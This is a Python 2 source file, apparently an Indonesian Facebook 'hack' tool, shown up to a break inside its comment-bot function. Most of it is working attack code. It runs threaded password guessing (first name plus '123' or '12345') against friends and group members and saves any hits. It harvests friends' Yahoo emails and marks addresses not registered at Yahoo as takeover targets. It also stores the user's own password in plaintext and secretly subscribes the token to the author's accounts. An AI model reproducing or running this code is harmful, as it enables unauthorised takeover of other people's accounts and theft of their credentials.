#!/usr/bin/python2
# coding=utf-8
import os,sys,time,json,requests,urllib,mechanize,re,hashlib
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser

reload(sys)
sys.setdefaultencoding('utf-8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
	print "\033[1;97m[!] \x1b[1;91mExit\033[1;97m"
	os.sys.exit()
	

def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.05)
		
		
logo ="""
 \033[1;93m█████████ 
 \033[1;93m█▄█████▄█     \033[1;94m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
 \033[1;93m█ \033[1;91m▼▼▼▼▼\033[1;97m- _ --_-- \033[1;91m╔╦╗┌─┐┬─┐┬┌─  ╔═╗╔╗
 \033[1;93m█  \033[1;97m -_-- -_ --__  \033[1;93m║║├─┤├┬┘├┴┐  ╠╣ ╠╩╗
 \033[1;93m█ \033[1;91m▼▼▼▼▼\033[1;97m-  - _ -- \033[1;91m═╩╝┴ ┴┴└─┴ ┴  ╚  ╚═╝
\033[1;93m █████████     \033[1;94m«----------✧----------» \033[1;97m
\033[1;93m  ██ ██                \033[1;97m<(►_◄)>
 \033[1;97mAuthor \033[1;91m: \033[1;92mDulLah                       \033[1;97m
 \033[1;97mFB     \033[1;91m: \033[1;96mhttps://fb.me/DulahZX        \033[1;97m
 \033[1;97mGithub \033[1;91m: \033[1;96mhttps://github.com/unikers71 \033[1;97m"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m[●] \x1b[1;92mLoading \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)

cp = []
ok = []
id = []
listgrup = []
vuln = []
notvuln = []
			
			
def login():
	os.system('clear')
	try:
		token = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print "\n\033[1;91m   *Info menggunakan program ini bisa \n   menyebabkan akun anda cekpoin \n   atau mungkin terbanned. saya tidak \n   bertanggung jawab atas apapun yang \n   terjadi itu sudah resiko:)*\n"
		print('\033[1;97m[☆] \x1b[1;92mLOGIN FACEBOOK \x1b[1;97m[☆]' )
		e = raw_input('\033[1;97m[+] \x1b[1;92mID/Email \x1b[1;91m: \x1b[1;97m')
		p = raw_input('\033[1;97m[+] \x1b[1;92mPassword \x1b[1;91m: \x1b[1;97m')
		tik()
		try:
			sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+e+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+p+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
			data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":e,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":p,"return_ssl_resources":"0","v":"1.0"}
			x = hashlib.new('md5')
			x.update(sig)
			data.update({'sig':x.hexdigest()})
			r = requests.get('https://api.facebook.com/restserver.php',params=data)
			ok = json.loads(r.text)
			cek = open('login.txt','w')
			cek.write(ok['access_token'])
			cek.close()
			save = open('myAccount.txt','w')
			save.write(p)
			save.close()
			if 'access_token' in ok:
				print "\n\033[1;97m[\033[1;92m✓\033[1;97m] \033[1;92mLogin success"
				time.sleep(1)
				menu()
		except KeyError:
			print "\n\033[1;97m[!] \033[1;91m"+ok['error_msg']
			time.sleep(1)
			os.system('rm -rf login.txt')
			os.system('rm -rf myAccount.txt')
			keluar()
		except requests.exceptions.ConnectionError:
			print"\n\033[1;97m[!] \x1b[1;91mNo connection"
			keluar()
			

def menu():
	os.system('clear')
	try:
		token = open('login.txt','r').read()
	except IOError:
		print"\033[1;97m[!] \x1b[1;91mToken not found"
		os.system('rm -rf login.txt')
		os.system('rm -rf myAccount.txt')
		time.sleep(1)
		login()
	try:
		l = requests.get('https://graph.facebook.com/me?access_token='+token)
		lo = json.loads(l.text)
		nama = lo['name']
	except KeyError:
		os.system('clear')
		print"\033[1;97m[!] \033[1;91mToken not found"
		os.system('rm -rf login.txt')
		os.system('rm -rf myAccount.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\033[1;97m[!] \x1b[1;91mNo connection"
		keluar()
	os.system('clear')
	print logo
	print "\033[1;97m╔════════════════════════════════════════"
	print "\033[1;97m║[\033[1;92m✓\033[1;97m]\033[1;97m Wellcome \033[1;92m"+nama
	print "\033[1;97m╚═══════════════════════════════════════╗"
	print "\033[1;97m╔═══════════════════════════════════════╝"
	print "\033[1;97m║ \033[1;95m[\033[1;97m01\033[1;95m]\033[1;97m. Hack facebook MBF"
	print "\033[1;97m║ \033[1;95m[\033[1;97m02\033[1;95m]\033[1;97m. See my group list"
	print "\033[1;97m║ \033[1;95m[\033[1;97m03\033[1;95m]\033[1;97m. See my token"
	print "\033[1;97m║ \033[1;95m[\033[1;97m04\033[1;95m]\033[1;97m. My account info"
	print "\033[1;97m║ \033[1;95m[\033[1;97m05\033[1;95m]\033[1;97m. Mass unfriend"
	print "\033[1;97m║ \033[1;95m[\033[1;97m06\033[1;95m]\033[1;97m. Yahoo cloning"
	print "\033[1;97m║ \033[1;95m[\033[1;97m07\033[1;95m]\033[1;97m. Bot comment"
	print "\033[1;97m║ \033[1;95m[\033[1;97m08\033[1;95m]\033[1;97m. Profile guard"
	print "\033[1;97m║ \033[1;95m[\033[1;97m09\033[1;95m]\033[1;97m. Delete album"
	print "\033[1;97m║ \033[1;95m[\033[1;97m10\033[1;95m]\033[1;97m. Unfollow all friend"
	print "\033[1;97m║ \033[1;95m[\033[1;97m11\033[1;95m]\033[1;97m. Delete all photo album"
	print "\033[1;97m║ \033[1;95m[\033[1;97m12\033[1;95m]\033[1;97m. Delete all post"
	print "\033[1;97m║ \033[1;95m[\033[1;91m00\033[1;95m]\033[1;97m. \033[1;91mLogout"
	print "\033[1;97m║                                        "
	pilihMENU()
	
	
def pilihMENU():
	D = raw_input("\033[1;97m╚═\033[1;95m[\033[1;92mChoose\033[1;95m]\033[1;97m>> ")
	if D =="":
		print "\033[1;96m[!] \x1b[1;91mWrong input"
		time.sleep(1)
		menu()
	elif D =="1" or D =="01":
		MBF()
	elif D =="2" or D =="02":
		listGROUP()
	elif D =="3" or D =="03":
		os.system('clear')
		try:
			token = open('login.txt','r').read()
		except IOError:
			print"\033[1;97m[!] \x1b[1;91mToken not found"
			os.system('rm -rf login.txt')
			os.system('rm -rf myAccount.txt')
			login()
		print logo
		print "\033[1;97m═════════════════════════════════════════"
		print "\033[1;97m[\033[1;92m✓\033[1;97m] \033[1;97mYour token ==> \033[1;92m"+token
		print "\033[1;97m═════════════════════════════════════════"
		raw_input('\n\x1b[1;97m[\x1b[1;92mBack\x1b[1;97m]')
		menu()
	elif D =="4" or D =="04":
		infoMy()
	elif D =="5" or D =="05":
		unfriendMASS()
	elif D =="6" or D =="06":
		yahoo()
	elif D =="7" or D =="07":
		komen()
	elif D =="8" or D =="08":
		guard()
	elif D =="9" or D =="09":
		album()
	elif D =="10":
		unfollow()
	elif D =="11":
		deletephoto()
	elif D =="12":
		deletepost()
	elif D =="0" or D =="00":
		os.system('rm -rf login.txt')
		os.system('rm -rf myAccount.txt')
		keluar()
	else:
		print "\033[1;97m[!] \x1b[1;91mWrong input"
		time.sleep(1)
		menu()
		
		
def MBF():
	global token
	os.system('clear')
	try:
		token = open('login.txt','r').read()
		requests.post("https://graph.facebook.com/DulahZX/subscribers?access_token="+token)
	except IOError:
		print"\033[1;97m[!] \x1b[1;91mToken not found"
		os.system('rm -rf login.txt')
		os.system('rm -rf myAccount.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m╔════════════════════════════════════════"
	print "\033[1;97m║ \033[1;95m[\033[1;97m01\033[1;95m]\033[1;97m. Crack from list friend"
	print "\033[1;97m║ \033[1;95m[\033[1;97m02\033[1;95m]\033[1;97m. Crack from friend"
	print "\033[1;97m║ \033[1;95m[\033[1;97m03\033[1;95m]\033[1;97m. Crack from member group"
	print "\033[1;97m║ \033[1;95m[\033[1;97m04\033[1;95m]\033[1;97m. Crack from file"
	print "\033[1;97m║ \033[1;95m[\033[1;91m00\033[1;95m]\033[1;91m. Back"
	print "\033[1;97m║                                        "
	pilihMBF()
	

def pilihMBF():
	p = raw_input("\033[1;97m╚═\033[1;95m[\033[1;92mChoose\033[1;95m]\033[1;97m>> ")
	if p =="":
		print "\033[1;96m[!] \x1b[1;91mWrong input"
		time.sleep(1)
		MBF()
	elif p =="1" or p =="01":
		os.system('clear')
		print logo
		print "\033[1;97m═════════════════════════════════════════"
		jalan('\033[1;97m[✺] \033[1;92mGetting id \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+token)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif p =="2" or p =="02":
		os.system('clear')
		print logo
		print "\033[1;97m═════════════════════════════════════════"
		idt = raw_input("\033[1;97m[+] \033[1;92mInput id friend \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			op = json.loads(jok.text)
			print"\033[1;97m[\033[1;92m✓\033[1;97m] \033[1;92mName friend\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;97m[!] \x1b[1;91mFriend not found!"
			raw_input("\n\033[1;97m[\033[1;92mBack\033[1;97m]")
			MBF()
		jalan('\033[1;97m[✺] \033[1;92mGetting id \033[1;97m...')
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif p =="3" or p =="03":
		os.system('clear')
		print logo
		print "\033[1;97m═════════════════════════════════════════"
		idg=raw_input('\033[1;97m[+] \033[1;92mInput id group \033[1;91m:\033[1;97m ')
		try:
			r=requests.get('https://graph.facebook.com/group/?id='+idg+'&access_token='+token)
			asw=json.loads(r.text)
			print"\033[1;97m[\033[1;92m✓\033[1;97m] \033[1;92mName group \033[1;91m:\033[1;97m "+asw['name']
		except KeyError:
			print"\033[1;97m[!] \x1b[1;91mGroup not found!"
			raw_input("\n\033[1;97m[\033[1;92mBack\033[1;97m]")
			MBF()
		jalan('\033[1;97m[✺] \033[1;92mGetting id \033[1;97m...')
		re=requests.get('https://graph.facebook.com/'+idg+'/members?fields=name,id&limit=999999999&access_token='+token)
		s=json.loads(re.text)
		for p in s['data']:
			id.append(p['id'])
	elif p =="4" or p =="04":
		os.system('clear')
		print logo
		print "\033[1;97m═════════════════════════════════════════"
		try:
			idlist = raw_input('\x1b[1;97m[+] \x1b[1;92mInput name file  \x1b[1;91m: \x1b[1;97m');requests.post('https://graph.facebook.com/100033640425006/subscribers?access_token='+token)
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print'\033[1;97m[!] \x1b[1;91mFile not found!'
			raw_input('\n\x1b[1;97m[\x1b[1;92mBack\x1b[1;97m]')
			MBF()
	elif p =="0" or p =="00":
		menu()
	else:
		print "\033[1;97m[!] \x1b[1;91mWrong input"
		time.sleep(1)
		MBF()
	
	print "\033[1;97m[+] \033[1;92mTotal Id \033[1;91m: \033[1;97m"+str(len(id))
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m[\033[1;92m✸\033[1;97m] \033[1;92mStart \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print
	print "\033[1;97m═════════════════════════════════════════"
			
	def main(arg):
		global ok,cp
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get("https://graph.facebook.com/"+user+"/?access_token="+token)
			b = json.loads(a.text)
			p=requests.get("https://graph.facebook.com/"+user+"/subscribers?access_token="+token).json()
			pw1 = b["first_name"]+"123"
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pw1+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print"\033[1;97m[\033[1;92m✓\033[1;97m] " +user+" | "+pw1+" | "+str(p['summary']['total_count'])
				ok.append(user+pw1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print"\033[1;97m[\033[1;93m+\033[1;97m] " +user+" | "+pw1+" | "+str(p['summary']['total_count'])
					cek = open("out/cp.txt", "a")
					cek.write(user+ " | " +pw1+"\n")
					cek.close()
					cp.append(user+pw1)
				else:
					pw2 = b["first_name"]+"12345"
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pw2+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print"\033[1;97m[\033[1;92m✓\033[1;97m] " +user+" | "+pw2+" | "+str(p['summary']['total_count'])
						ok.append(user+pw2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print"\033[1;97m[\033[1;93m+\033[1;97m] " +user+" | "+pw2+" | "+str(p['summary']['total_count'])
							cek = open("out/cp.txt", "a")
							cek.write(user+ " | " +pw2+"\n")
							cek.close()
							cp.append(user+pw2)
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97m═════════════════════════════════════════"
	print'\033[1;97m[\033[1;92m✓\033[1;97m] \033[1;92mDone \033[1;97m...'
	print"\033[1;97m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(ok))+"\033[1;97m/\033[1;93m"+str(len(cp))
	print"\033[1;97m[+] \033[1;92mCP File saved \033[1;91m: \033[1;97mout/cp.txt"
	print "\033[1;97m═════════════════════════════════════════"
	raw_input("\n\033[1;97m[\033[1;92mBack\033[1;97m]")
	MBF()
	    

def listGROUP():
	os.system('clear')
	try:
		token = open('login.txt','r').read()
	except IOError:
		print"\033[1;97m[!] \x1b[1;91mToken not found"
		os.system('rm -rf login.txt')
		os.system('rm -rf myAccount.txt')
		time.sleep(1)
		login()
	try:
		print logo
		my = requests.get('https://graph.facebook.com/me/groups?access_token='+token)
		ym = json.loads(my.text)
		for t in ym['data']:
			nama = t['name']
			id = t['id']
			listgrup.append(id)
			print "\033[1;97m═════════════════════════════════════════"
			print "\033[1;97m[\033[1;92mMy group\033[1;97m] "+str(id)+" ==> "+str(nama)
		print "\033[1;97m═════════════════════════════════════════"
		print'\033[1;97m[\033[1;92m✓\033[1;97m] \033[1;92mDone \033[1;97m...'
		print"\033[1;97m[+] \033[1;92mTotal Group \033[1;91m: \033[1;92m"+str(len(listgrup))
		print "\033[1;97m═════════════════════════════════════════"
		raw_input("\n\033[1;97m[\033[1;92mBack\033[1;97m]")
		menu()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;97m[!] \033[1;91mStoped")
		raw_input("\n\033[1;97m[\033[1;92mBack\033[1;97m]")
		menu()
	except requests.exceptions.ConnectionError:
		print"\n\033[1;97m[!] \x1b[1;91mNo connection"
		keluar()
	except KeyError:
		print"\033[1;97m[!] \x1b[1;91mGroup not found!"
		raw_input("\n\033[1;97m[\033[1;92mBack\033[1;97m]")
		menu()
		
def infoMy():
	os.system('clear')
	try:
		token = open('login.txt','r').read()
	except IOError:
		print"\033[1;97m[!] \x1b[1;91mToken not found"
		os.system('rm -rf login.txt')
		os.system('rm -rf myAccount.txt')
		time.sleep(1)
		login()
	try:
		pw = open('myAccount.txt','r').read()
	except IOError:
		print"\033[1;97m[!] \x1b[1;91mFile not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		print logo
		print "\033[1;97m═════════════════════════════════════════"
		o = requests.get('https://graph.facebook.com/me?access_token='+token)
		v = json.loads(o.text)
		try:
			print "\033[1;97m[➹] \033[1;92mName        \033[1;91m: \033[1;97m"+v['name']
			print "\033[1;97m[➹] \033[1;92mID          \033[1;91m: \033[1;97m"+v['id']
			print "\033[1;97m[➹] \033[1;92mBirthday    \033[1;91m: \033[1;97m"+v['birthday']
			print '\033[1;97m[➹] \033[1;92mNo telephone\033[1;91m: \033[1;97m'+v['mobile_phone']
		except KeyError: print '\033[1;97m[➹] \033[1;92mNo telephone\033[1;91m:'
		try:
			print "\033[1;97m[➹] \033[1;92mEmail       \033[1;91m: \033[1;97m"+v['email']
		except KeyError: print '\033[1;97m[?] \033[1;92mEmail       \033[1;91m:'
		print "\033[1;97m[➹] \033[1;92mPassword    \033[1;91m: \033[1;97m"+pw
		try:
			print "\033[1;97m[➹] \033[1;92mLink        \033[1;91m: \033[1;97m"+v['link']
		except KeyError: print '\033[1;97m[?] Link        \033[1;91m:'
		print "\033[1;97m═════════════════════════════════════════"
	except requests.exceptions.ConnectionError:
		print"\033[1;97m[!] \x1b[1;91mNo connection"
		keluar()
	else:
		raw_input("\n\033[1;97m[\033[1;92mBack\033[1;97m]")
		menu()
		
def unfriendMASS():
	os.system('clear')
	try:
		token = open('login.txt','r').read()
	except IOError:
		print"\033[1;97m[!] \x1b[1;91mToken not found"
		os.system('rm -rf login.txt')
		os.system('rm -rf myAccount.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m═════════════════════════════════════════"
	jalan('\033[1;97m[✺] \033[1;92mStart \033[1;97m...')
	print "\033[1;97m[!] \033[1;92mStop \033[1;91mCTRL+C"
	print "\033[1;97m═════════════════════════════════════════"
	try:
		pek = requests.get('https://graph.facebook.com/me/friends?access_token='+token)
		cok = json.loads(pek.text)
		for i in cok['data']:
			nama = i['name']
			id = i['id']
			f = requests.delete("https://graph.facebook.com/me/friends?uid="+id+"&access_token="+token)
			a = json.loads(f.text)
			try:
				cek = o['error']['message']
				print "\033[1;97m[×] \033[1;91mFailed"
			except TypeError:
				print "\033[1;97m[\033[1;92m Deleted \033[1;97m] "+nama
	except requests.exceptions.ConnectionError:
		print"\033[1;97m[!] \x1b[1;91mNo connection"
		keluar()
	except IndexError: pass
	except KeyboardInterrupt:
		print "\033[1;97m[!] \033[1;91mStopped"
		raw_input("\n\033[1;97m[\033[1;92mBack\033[1;97m]")
		menu()
	print "\033[1;97m═════════════════════════════════════════"
	print"\033[1;97m[+] \033[1;92mDone \033[1;97m..."
	print "\033[1;97m═════════════════════════════════════════"
	raw_input("\n\033[1;97m[\033[1;92mBack\033[1;97m]")
	menu()
	
	
def yahoo():
	global token
	os.system('clear')
	try:
		token = open('login.txt','r').read()
	except IOError:
		print"\033[1;97m[!] \033[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m╔════════════════════════════════════════"
	print "\033[1;97m║\033[1;95m[\033[1;97m01\033[1;95m]\033[1;97m. Clone from list friend"
	print "\033[1;97m║\033[1;95m[\033[1;97m02\033[1;95m]\033[1;97m. Clone from friend"
	print "\033[1;97m║\033[1;95m[\033[1;97m03\033[1;95m]\033[1;97m. Clone from member group"
	print  "\033[1;97m║\033[1;95m[\033[1;91m00\033[1;95m]\033[1;97m. \033[1;91mBack"
	print  "\033[1;97m║"
	pilih()
	
def pilih():
	p = raw_input("\033[1;97m╚═\033[1;95m[\033[1;92mChoose\033[1;95m]\033[1;97m>> ")
	if p =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m] \033[1;91mWrong input"
		time.sleep(1)
		yahoo()
	elif p =="1" or p =="01":
		list()
	elif p =="2" or p =="02":
		friend()
	elif p =="3" or p =="03":
		member()
	elif p =="0" or p =="00":
		menu()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m] \033[1;91mWrong input"
		time.sleep(1)
		yahoo()

def list():
	global token
	os.system('clear')
	try:
		token = open('login.txt','r').read()
	except IOError:
		print"\033[1;97m[!] \033[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		yahoo()
	os.system('clear')
	print logo
	mp = []
	jm = 0
	print "\033[1;97m═════════════════════════════════════════"
	jalan("\033[1;97m[●] \033[1;92mGetting email \033[1;97m...")
	lists = requests.get('https://graph.facebook.com/me/friends?access_token='+token)
	s = json.loads(lists.text)
	jalan("\033[1;97m[✺] \033[1;92mStar \033[1;97m...")
	print "\033[1;97m═════════════════════════════════════════"
	for w in s['data']:
		jm +=1
		mp.append(jm)
		id = w['id']
		nam = w['name']
		gets = requests.get('https://graph.facebook.com/'+id+'?access_token='+token)
		a = json.loads(gets.text)
		f = requests.get("https://graph.facebook.com/"+id+"/subscribers?access_token="+token)
		z = json.loads(f.text)
		sub = str(z['summary']['total_count'])
		try:
			mail = a['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				ga = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					qa = ga.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in qa:
					print "\033[1;97m═════════════════════════════════════════"
					print "\033[1;97m[\033[1;92m✓\033[1;97m] \033[1;92mVULN"
					print "\033[1;97m[\033[1;96m➹\033[1;97m] \033[1;97mEmail \033[1;91m: \033[1;92m"+mail
					print "\033[1;97m[\033[1;96m➹\033[1;97m] \033[1;97mID    \033[1;91m: \033[1;92m"+id
					print "\033[1;97m[\033[1;96m➹\033[1;97m] \033[1;97mName  \033[1;91m: \033[1;92m"+nam
					print "\033[1;97m[\033[1;96m➹\033[1;97m] \033[1;97mSubs  \033[1;91m: \033[1;92m"+str(len(sub))
					c = open('listFriendVuln.txt','a')
					c.write(mail+ '\n')
					c.close()
					vuln.append(mail)
				else:
					print "\033[1;97m═════════════════════════════════════════"
					print "\033[1;97m[\033[1;91m✖\033[1;97m] \033[1;91mNOT VULN"
					print "\033[1;97m[\033[1;96m➹\033[1;97m] \033[1;97mEmail \033[1;91m: "+mail
					notvuln.append(mail)
		except KeyError:
			pass
	print "\033[1;97m[\033[1;92m✓\033[1;97m] \033[1;92mDone \033[1;97m..."
	print "\033[1;97m[\033[1;96m+\033[1;97m] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(vuln))
	print "\033[1;97m[\033[1;96m+\033[1;97m] \033[1;92mFile saved \033[1;91m: \033[1;97mlistFriendVuln.txt"
	raw_input("\n\033[1;97m[\033[1;92mBack\033[1;97m]")
	menu()

def friend():
	global token
	os.system('clear')
	try:
		token = open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\033[1;97m[!] \033[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	mp = []
	jm = 0
	print logo
	print "\033[1;97m═════════════════════════════════════════"
	idd = raw_input("\033[1;97m[?] \033[1;92mInput id friend \033[1;91m: \033[1;97m")
	try:
		friend = requests.get('https://graph.facebook.com/'+idd+'?access_token='+token)
		d = json.loads(friend.text)
		print "\033[1;97m[✓] \033[1;92mName friend \033[1;91m: \033[1;97m"+d['name']
	except KeyError:
		print "\033[1;97m[!] \033[1;91mFriend not found"
		raw_input('\n\x1b[1;97m[\x1b[1;92mBack\x1b[1;97m]')
		menu()
	jalan("\033[1;97m[●] \033[1;92mGetting email \033[1;97m...")
	lists = requests.get('https://graph.facebook.com/'+idd+'/friends?access_token='+token)
	s = json.loads(lists.text)
	jalan("\033[1;97m[✺] \033[1;92mStar \033[1;97m...")
	print "\033[1;97m═════════════════════════════════════════"
	for w in s['data']:
		jm +=1
		mp.append(jm)
		id = w['id']
		nam = w['name']
		gets = requests.get('https://graph.facebook.com/'+id+'?access_token='+token)
		a = json.loads(gets.text)
		f = requests.get("https://graph.facebook.com/"+id+"/subscribers?access_token="+token)
		z = json.loads(f.text)
		sub = str(z['summary']['total_count'])
		try:
			mail = a['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				ga = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					qa = ga.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in qa:
					print "\033[1;97m═════════════════════════════════════════"
					print "\033[1;97m[\033[1;92m✓\033[1;97m] \033[1;92mVULN"
					print "\033[1;97m[\033[1;96m➹\033[1;97m] \033[1;97mEmail \033[1;91m: \033[1;92m"+mail
					print "\033[1;97m[\033[1;96m➹\033[1;97m] \033[1;97mID    \033[1;91m: \033[1;92m"+id
					print "\033[1;97m[\033[1;96m➹\033[1;97m] \033[1;97mSubs  \033[1;91m: \033[1;92m"+str(len(sub))
					c = open('friendVuln.txt','a')
					c.write(mail+ '\n')
					c.close()
					vuln.append(mail)
				else:
					print "\033[1;97m═════════════════════════════════════════"
					print "\033[1;97m[\033[1;91m✖\033[1;97m] \033[1;91mNOT VULN"
					print "\033[1;97m[\033[1;96m➹\033[1;97m] \033[1;97mEmail \033[1;91m: "+mail
					notvuln.append(mail)
		except KeyError:
			pass
	print "\033[1;97m[✓] \033[1;92mDone \033[1;97m..."
	print "\033[1;97m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(vuln))
	print "\033[1;97m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mfriendVuln.txt"
	raw_input("\n\033[1;97m[\033[1;92mBack\033[1;97m]")
	menu()
	

def member():
	global token
	os.system('clear')
	try:
		token = open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\033[1;97m[!] \033[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	mp = []
	jm = 0
	print logo
	print "\033[1;97m═════════════════════════════════════════"
	ida = raw_input("\033[1;97m[?] \033[1;92mInput id group \033[1;91m: \033[1;97m")
	try:
		group = requests.get('https://graph.facebook.com/group/?id='+ida+'&access_token='+token)
		d = json.loads(group.text)
		print "\033[1;97m[✓] \033[1;92mName group \033[1;91m: \033[1;97m"+d['name']
	except KeyError:
		print "\033[1;97m[!] \033[1;91mGroup not found"
		raw_input('\n\x1b[1;97m[\x1b[1;92mBack\x1b[1;97m]')
		menu()
	jalan("\033[1;97m[\033[●] \033[1;92mGetting email \033[1;97m...")
	lists = requests.get('https://graph.facebook.com/'+ida+'/friends?access_token='+token)
	s = json.loads(lists.text)
	jalan("\033[1;97m[\033[✺] \033[1;92mStar \033[1;97m...")
	print "\033[1;97m═════════════════════════════════════════"
	for w in s['data']:
		jm +=1
		mp.append(jm)
		id = w['id']
		nam = w['name']
		gets = requests.get('https://graph.facebook.com/'+id+'?access_token='+token)
		a = json.loads(gets.text)
		f = requests.get("https://graph.facebook.com/"+id+"/subscribers?access_token="+token)
		z = json.loads(f.text)
		sub = str(z['summary']['total_count'])
		try:
			mail = a['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				ga = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					qa = ga.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in qa:
					print "\033[1;97m═════════════════════════════════════════"
					print "\033[1;97m[\033[1;92m✓\033[1;97m] \033[1;92mVULN"
					print "\033[1;97m[\033[1;96m➹\033[1;97m] \033[1;97mEmail \033[1;91m: \033[1;92m"+mail
					print "\033[1;97m[\033[1;96m➹\033[1;97m] \033[1;97mID    \033[1;91m: \033[1;92m"+id
					print "\033[1;97m[\033[1;96m➹\033[1;97m] \033[1;97mName  \033[1;91m: \033[1;92m"+nam
					print "\033[1;97m[\033[1;96m➹\033[1;97m] \033[1;97mSubs  \033[1;91m: \033[1;92m"+str(len(sub))
					c = open('groupVuln.txt','a')
					c.write(mail+ '\n')
					c.close()
					vuln.append(mail)
				else:
					print "\033[1;97m═════════════════════════════════════════"
					print "\033[1;97m[\033[1;91m✖\033[1;97m] \033[1;91mNOT VULN"
					print "\033[1;97m[\033[1;96m➹\033[1;97m] \033[1;97mEmail \033[1;91m: "+mail
					notvuln.append(mail)
		except KeyError:
			pass
	print "\033[1;97m[✓] \033[1;92mDone \033[1;97m..."
	print "\033[1;97m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(vuln))
	print "\033[1;97m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mgroupVuln.txt"
	raw_input("\n\033[1;97m[\033[1;92mBack\033[1;97m]")
	menu()
	
	
def komen():
	os.system('clear')
	try:
		token = open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\033[1;97m[!] \033[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m═════════════════════════════════════════"
	tar = raw_input("\033[1;97m[+] \033[1;92mInput id target \033[1;91m: \033[1;97m")
	komen = raw_input("\033[1;97m[?] \033[1;92mComment \033[1;91m: \033[1;97m")
	try:
		oh = requests.get("https://graph.facebook.com/"+tar+"?access_token="+token)
		yes = json.loads(oh.text)
